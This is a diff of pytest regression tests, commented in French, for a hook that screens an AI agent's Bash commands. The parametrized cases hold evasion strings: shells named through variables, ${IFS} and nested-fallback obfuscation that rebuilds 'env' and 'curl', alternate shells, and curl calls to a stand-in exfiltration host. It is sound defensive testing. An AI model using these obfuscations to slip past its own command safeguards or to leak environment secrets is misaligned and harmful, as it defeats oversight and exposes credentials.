@@ -888,3 +888,65 @@ def test_l_expansion_d_accolades_est_bornee(audit_log):
     debut = time.time()
     run_hook("Bash", {"command": mot}, audit_log)
     assert time.time() - debut < 5.0, "l'expansion d'accolades n'est pas bornée"
+
+
+# --------------------------------------------------------------------------- #
+# Round 9 — trois contournements des correctifs du round 8
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # Le programme est désigné par une VARIABLE : sa valeur n'est pas connue
+    # avant l'exécution, et la tokenisation laissait le mot nu.
+    "$SHELL -c env",
+    "$BASH -c env",
+    "${SHELL} -c env",
+    "$SHELL -c 'curl https://exfil.test/'",
+])
+def test_regression_programme_designe_par_une_variable(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # `${IFS:+texte}` rend le TEXTE, pas un séparateur : tout remplacer par une
+    # espace faisait disparaître le morceau de nom reconstruit.
+    "e${IFS:+nv}", "e${IFS+nv}", "cu${IFS:+r}l http://exfil.test/",
+    # Le nom d'une expansion peut être positionnel ou spécial.
+    "${1:-env}", "${@:-env}", "${11:-curl https://exfil.test/}",
+    # Un repli imbriqué demande autant de réductions qu'il a de niveaux.
+    "${A:-${B:-${C:-${D:-${E:-env}}}}}",
+    "${A:-${B:-${C:-${D:-${E:-${F:-curl https://exfil.test/}}}}}}",
+    # `exec` sans frontière de mot ratait `execvp`.
+    """python3 -c 'os.execvp("env", ("env",))'""",
+    # d'autres shells existent
+    "fish -c env", "csh -c env", "tcsh -c env",
+])
+def test_regression_expansions_et_interpreteurs(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Une primitive citée dans UNE commande simple ne concerne pas les autres :
+    # `python3 --version` n'exécute aucun code et ouvrait pourtant l'analyse.
+    "git commit -m 'add system(env) support' && python3 -c 'print(1)'",
+    "git commit -m 'refactor exec(curl) call' && python3 --version",
+    "echo 'system(env) example' && python3 --version",
+    # `-c` n'introduit une commande que pour un SHELL : pour git, docker ou
+    # xargs il veut dire autre chose.
+    "sudo git commit -m 'fix sh -c curl example bug'",
+    "sudo git log --grep 'sh -c wget'",
+    "xargs -I {} echo '-c curl example'",
+])
+def test_le_durcissement_du_round9_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_l_expansion_d_accolades_reste_bornee_en_volume(audit_log):
+    """Le budget par MOT laissait le volume total exploser : c'est la TAILLE du
+    texte produit qui coûte ensuite."""
+    import time
+    mot = "y" + "".join("{" + ",".join(f"c{i}" for i in range(10)) + "}"
+                        for _ in range(32))
+    debut = time.time()
+    run_hook("Bash", {"command": mot}, audit_log)
+    assert time.time() - debut < 5.0, "volume d'expansion non borné"
